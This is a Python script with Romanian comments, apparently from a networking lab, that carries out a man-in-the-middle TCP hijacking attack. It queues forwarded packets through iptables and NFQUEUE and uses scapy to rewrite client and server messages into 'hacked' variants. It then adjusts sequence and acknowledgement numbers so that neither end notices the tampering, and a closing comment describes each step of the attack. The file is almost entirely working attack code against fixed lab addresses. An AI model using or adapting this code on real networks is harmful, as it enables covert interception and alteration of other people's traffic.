#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os
import logging
import random

logging.basicConfig(format = u'[LINE:%(lineno)d]# %(levelname)-8s [%(asctime)s]  %(message)s', level = logging.NOTSET)

# variabile globale pentru a modifica in mod corect ack_nr si seq_nr dupa ce mesajul este modificat
client_ack_nr_expected = None # ack_nr care este asteptat de client dupa ce a trimis mesajul
client_start_seq_nr_expected = None # de la ce seq_nr se asteapta clientul sa inceapa urmatorul mesaj primit
server_ack_nr_expected = None # ack_nr care este asteptat de server dupa ce a trimis mesajul
server_start_seq_nr_expected = None # de la ce seq_nr se asteapta serverul sa inceapa urmatorul mesaj primit
client_server_dictionar = {} # dictionar in care retin informatii pentru pachetele care circula de la client la server
                             # key = seq_start:seq_final       
                             # value = de unde ar trebui sa inceapa seq_nr pentru server pentru pachetul curent
                                                                                   
server_client_dictionar = {} # dictionar in care retin informatii pentru pachetele care circula de la server la client
                             # key = seq_start:seq_final       
                             # value = de unde ar trebui sa inceapa seq_nr pentru client pentru pachetul curent


def detect_and_alter_packet(packet):
    # Functie care se apeleaza pentru fiecare pachet din coada
    
    octets = packet.get_payload()
    scapy_packet = IP(octets)

    # scapy_packet.show()

    # daca pachetul are layer de IP si TCP (le preiau si pe cele fara layer Raw pentru a modifica ack_nr la confirmari)
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP):

        # variabila care retine daca pachetul este modificat sau nu
        scapy_packet_modificat = None
        
        # daca mesajul circula de la clientul '172.7.0.2' spre server-ul '198.7.0.2'
        if scapy_packet[IP].src == '172.7.0.2' and scapy_packet[IP].dst == '198.7.0.2':
            # noul scapy_packet este modificat cu functia alter_packet ce are True la variabila client_server
            scapy_packet_modificat = alter_packet(scapy_packet,False,True)

        # daca mesajul circula de la server-ul '198.7.0.2' spre clientul '172.7.0.2'
        if scapy_packet[IP].src == '198.7.0.2' and scapy_packet[IP].dst == '172.7.0.2':
            # noul scapy_packet este modificat cu functia alter_packet ce are True la variabila server_client
            scapy_packet_modificat = alter_packet(scapy_packet,True,False)

        # daca pachetul a fost modificat
        if scapy_packet_modificat is not None:
            # extragem octetii din pachet
            octets = bytes(scapy_packet_modificat)

            # il punem inapoi in coada modificat
            packet.set_payload(octets)

    # apelam accept pentru fiecare pachet din coada
    packet.accept()


def alter_packet(packet,server_client,client_server):
    # server_client este o variabila booleana care specifica daca mesajul este transmis de la server la client
    # client_server este o variabila booleana care specifica daca mesajul este transmis de la client la server
    #
    # Doar una singura (server_client sau client_server) poate fi True la un moment dat

    # foloses variabilele globale definite
    global client_ack_nr_expected
    global client_start_seq_nr_expected
    global server_ack_nr_expected
    global server_start_seq_nr_expected
    global client_server_dictionar
    global server_client_dictionar
   
    # afisare informatii inainte de prelucrarea pachetului
    logging.info("")
    logging.info("[Summary packet]:" + str(packet.summary()))
    logging.info("")
    if packet.haslayer(Raw):
        logging.info("[Before RAW Load]:  " + str(packet.getlayer(Raw).load))
    
    #packet.show()


    # daca pachetul are mesaj trimis
    if packet.haslayer(Raw):

        # generez cheia pentru pachetul curent
        key = str(packet[TCP].seq) + ":" + str(packet[TCP].seq + len(packet[Raw].load))

        # daca mesajul se duce la server
        if client_server is True:

            # salvez ce ack_nr stie clientul ca trebuie sa primeasca
            client_ack_nr_expected = int(key.split(":")[1])

            
            # afisare informatii inainte de prelucrarea pachetului
            logging.info("")
            logging.info(f"[CLIENT -- BEFORE] seq_nr {packet[TCP].seq}:{client_ack_nr_expected} , ack = {packet[TCP].ack}")
            logging.info(f"server_ack_nr_expected = {server_ack_nr_expected}")
            logging.info("")

            # modificam mesajul transmis in functie de valoarea option

            # extrag numarul mesajului
            raw = str(packet[Raw].load)
            raw = raw.split("_")[1]

            option = random.randrange(1,500)
            # option = [1,199) ==> mesajul este modificat ( lungimea se pastreaza )
            # option = [200,399] ==> mesajul este modificat ( lungimea se micsoreaza )
            # option = (400,500] ==> mesajul nu este modificat


            if option < 200:
                # mesajul modificat are aceeasi lungime ca mesajul original
                raw = "hacked_" + raw
                packet[Raw].load = raw
            else:
                if 200 <= option < 400:
                    # mesajul modificat are o lungime mai mica decat mesajul original
                    raw = "mH_" + raw
                    packet[Raw].load = raw


            
            # ###############
            # pregatirea seq_nr de start pentru pachetul urmator (serverul va primi mereu intervale de secventa diferite)

            # daca variabila are valoare (o singura data nu are valoare ==> atunci cand este primul pachet interceptat)
            if server_start_seq_nr_expected is not None:

                # daca acesta este un pachet nou
                if key not in server_client_dictionar.keys():

                    # modific secventa de start 
                    packet[TCP].seq = server_start_seq_nr_expected

                    # adaug in dictionar secventa curenta de start pentru pachetul curent
                    server_client_dictionar.update({key:server_start_seq_nr_expected})

                    # calculez secventa viitoare de start
                    server_start_seq_nr_expected = server_start_seq_nr_expected + len(packet[Raw].load)

                else: # pachetul este retransmis (a mai fost transmis anterior)
                    # daca exista valoarea secventei de start (daca nu este retransmis pachetul intial ci unul ulterior)
                    if server_client_dictionar[key] is not None:
                        # modific secventa de start 
                        packet[TCP].seq = int(server_client_dictionar[key])
                    else:
                        # calculez secventa viitoare de start
                        server_start_seq_nr_expected = packet[TCP].seq + len(packet[Raw].load)
            
            else: # daca variabila nu are valoare (o singura data nu are valoare ==> atunci cand este primul pachet interceptat)
                
                # calculez secventa viitoare de start
                server_start_seq_nr_expected = packet[TCP].seq + len(packet[Raw].load)

                # pentru pachetul curent adaug valoarea None 
                server_client_dictionar.update({key:None})


            # ###############
            # modific ack_nr cu care clientul va confirma ce a primit anterior de la server

            # daca variabile are valoare (o singura data nu are valoare ==> cand serverul inca nu a trimis un pachet spre client)
            if server_ack_nr_expected is not None:
                # modific ack_nr pachetului cu cel asteptat de server
                packet[TCP].ack = server_ack_nr_expected


            # afisare informatii dupa prelucrarea pachetului
            logging.info(f"[CLIENT -- AFTER] seq_nr {packet[TCP].seq}:{server_start_seq_nr_expected} , ack = {packet[TCP].ack}")
            logging.info(f"server_start_seq_nr_expected = {server_start_seq_nr_expected}")

        
        else: # daca mesajul se duce la client
            
            # salvez ce ack_nr stie serverul ca trebuie sa primeasca
            server_ack_nr_expected = packet[TCP].seq + len(packet[Raw].load)

            # afisare informatii inainte de prelucrarea pachetului
            logging.info("")
            logging.info(f"[SERVER -- BEFORE] seq_nr {packet[TCP].seq}:{server_ack_nr_expected} , ack = {packet[TCP].ack}")
            logging.info(f"client_ack_nr_expected = {client_ack_nr_expected}")
            logging.info("")


            # modificam mesajul transmis in functie de valoarea option
            
            # extrag mesajul trimis de client si modifcat de middle
            raw = str(packet[Raw].load)
            raw = raw.split(":")[1]

            option = random.randrange(1,500)
            # option = [1,199) ==> mesajul este modificat ( lungimea se pastreaza )
            # option = [200,399] ==> mesajul este modificat ( lungimea se micsoreaza )
            # option = (400,500] ==> mesajul nu este modificat

            if option < 200:
                # mesajul modificat are aceeasi lungime ca mesajul original
                raw = "Server a hacked mesajul:" + raw
                raw = raw[:(len(raw) - 1)] # dintr-un anume motiv nedetectat se pune un '\' la final . Il elimin pentru ca nu este necesar
                packet[Raw].load = raw
            else:
                if 200 <= option < 400:
                    # mesajul modificat are o lungime mai mica decat mesajul original
                    raw = "Server HACK mesajul:" + raw
                    raw = raw[:(len(raw) - 1)] # dintr-un anume motiv nedetectat se pune un '\' la final . Il elimin pentru ca nu este necesar
                    packet[Raw].load = raw


            # ###############
            # pregatirea seq_nr de start pentru pachetul urmator (clientul va primi mereu intervale de secventa diferite)

            # daca variabila are valoare (o singura data nu are valoare ==> atunci cand este primul pachet interceptat)
            if client_start_seq_nr_expected is not None:

                # daca acesta este un pachet nou
                if key not in client_server_dictionar.keys():
                    
                    # modific secventa de start 
                    packet[TCP].seq = client_start_seq_nr_expected

                    # adaug in dictionar secventa curenta de start pentru pachetul curent
                    client_server_dictionar.update({key:client_start_seq_nr_expected})

                    # calculez secventa viitoare de start
                    client_start_seq_nr_expected = client_start_seq_nr_expected + len(packet[Raw].load)
                
                else: # pachetul este retransmis (a mai fost transmis anterior)
                    
                    # daca exista valoarea secventei de start (daca nu este retransmis pachetul intial ci unul ulterior)
                    if client_server_dictionar[key] is not None:
                        # modific secventa de start 
                        packet[TCP].seq = int(client_server_dictionar[key])
                    else:
                        # calculez secventa viitoare de start
                        client_start_seq_nr_expected = packet[TCP].seq + len(packet[Raw].load)
            
            else: # daca variabila nu are valoare (o singura data nu are valoare ==> atunci cand este primul pachet interceptat)
                
                # calculez secventa viitoare de start
                client_start_seq_nr_expected = packet[TCP].seq + len(packet[Raw].load)

                # pentru pachetul curent adaug valoarea None 
                client_server_dictionar.update({key:None})


            # ###############
            # modific ack_nr cu care serverul va confirma ce a primit anterior de la client

            # daca variabile are valoare (o singura data nu are valoare ==> cand clientul inca nu a trimis un pachet spre server)
            if client_ack_nr_expected is not None:
                # modific ack_nr pachetului cu cel asteptat de client
                packet[TCP].ack = client_ack_nr_expected

            # afisare informatii dupa prelucrarea pachetului
            logging.info("")
            logging.info(f"[SERVER -- AFTER] seq_nr {packet[TCP].seq}:{client_start_seq_nr_expected} , ack = {packet[TCP].ack}")
            logging.info(f"client_start_seq_nr_expected = {client_start_seq_nr_expected}")
            logging.info("")


    else: # pachetul nu are mesaj transmis ==> confirmare, reset, cerere de finalizare ...
        
        logging.info("")
        logging.info(f"Alt tip de pachet.  Flag = {packet[TCP].flags}")

        # daca este o confirmare
        if packet[TCP].flags == 'A':
            logging.info(f"Confirmare ack = {packet[TCP].ack}")

            # daca este o confirmare pe care o trimite clientul serverului pentru un mesaj primit de la server
            # 'server_ack_nr_expected is not None' pentru ca daca este confirmarea pentru primul pachet interceptat nu
            # ar trebui sa intervin la acel ack_nr
            if client_server is True and server_ack_nr_expected is not None:
                # modific ack_nr cu cel asteptat de server
                packet[TCP].ack = server_ack_nr_expected
                logging.info(f"CLIENT flag A ==> ack = {packet[TCP].ack}")
                
            # daca este o confirmare pe care o trimite serverul clientului pentru un mesaj primit de la client
            # 'client_ack_nr_expected is not None' pentru ca daca este confirmarea pentru primul pachet interceptat nu
            # ar trebui sa intervin la acel ack_nr
            if server_client is True and client_ack_nr_expected is not None:
                # modific ack_nr cu cel asteptat de client
                packet[TCP].ack = client_ack_nr_expected
                logging.info(f"SERVER flag A ==> ack = {packet[TCP].ack}")
            
   
    # am modificat pachetul ==> stergem campurile len si checksum
    # in mod normal ar trebui recalculate, dar scapy face asta automat
    del packet[IP].len # campul packet[IP].len este extrem de important pentru ca el va reface dinemsiunea pachetului
                       # si in functie de asta se va ajusta in mod corespunzator si secventa transmisa care are ca
                       # nr de start packet[TCP].seq modificat anterior in pachet
    del packet[IP].chksum
    del packet[TCP].chksum

    # afisare informatii dupa prelucrarea pachetului
    if packet.haslayer(Raw):
        logging.info("[After RAW Load]:  " + str(packet.getlayer(Raw).load))
    logging.info("----------------------------------------")
    # packet.show()

    # returnam pachetul modificat
    return packet


def main():

    # se creeaza un obiect de tip coada de filtrare
    queue = NFQ()

    try:
        # adauga toate pachetele care vor fi interceptate in coada
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 16")

        # bind trebuie să folosească aceiași coadă ca cea definită în iptables
        queue.bind(16, detect_and_alter_packet)
        queue.run()
        
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()

if __name__ == "__main__":
    # Pentru acest experiment am presupus ca transmiterea mesajelor intre server si client va fi urmatoarea:
    #   a. clientul trimite un mesaj serverului ( ex: mesajul_1 )
    #   b. serverul primeste mesajul de la client si trimite o confirmare cu mesajul primit (ex: Server a primit mesajul: mesajul_1 )
    #   c. se repeta pasii 1 - 2 pe termen nedefinit. 

    # In momentul in care se va modifica mesajul folosindu-se TCP Hijacking transmiterea mesajelor va fi urmatoarea:
    #   1. clientul trimite un mesaj serverului ( ex: mesajul_2 )
    #
    #   2. mesajul este interceptat de atacator si se modifica in hacked_2 sau mH_2 sau ramane nemodificat 
    #
    #   3. se modifica intervalul de secventa pentru mesajul trimis de client astfel incat sa corespunda noului mesaj modificat si se scrie
    #      in pachet seq_nr de start (de unde va incepe secventa ==> packet[TCP].seq)
    #
    #   4. ce scrie in pachet ack_nr care este asteptat de server ==> packet[TCP].ack
    #
    #   5. se refac valorile pt IP.len, IP.checksum si TCP.checksum
    #
    #   6. se trimite noul pachet la server care va primi mesajul modificat
    #
    #   5. dupa ce verifica ca ack nr este corect acesta va trimite un nou mesaj compus din mesajul primit 
    #      ( ex: Server a primit mesajul: mesaj_primit ) 
    #
    #   6. mesajul este interceptat de atacator si se modifica in:
    #      `Server a hacked mesajul: mesaj_primit`    sau    `Server HACK mesajul mesaj_primit`   sau    nu se modifica 
    #
    #   7. se seteaza ack_nr corespunzator pentru mesajul 'mesajul_2' (cel fara modificare) pentru a pacali clientul
    #      ca mesajul a fost trimis nemodificat
    #
    #   8. se modifica seq_nr pentru a corespunde mesajului modificat
    #
    #   9. se trimite pachetul modificat la client
    #
    #  10. Clientul trimite o confirmare de primire cu flagul 'A'
    #
    #  11. Se intercepoteaza acel mesaj de middle si modifica ack_nr din pachet astfel incat serverul sa primeasca ack_nr pe care il astepta
    #
    #  12. Se reiau pasii 1 - 11
    main()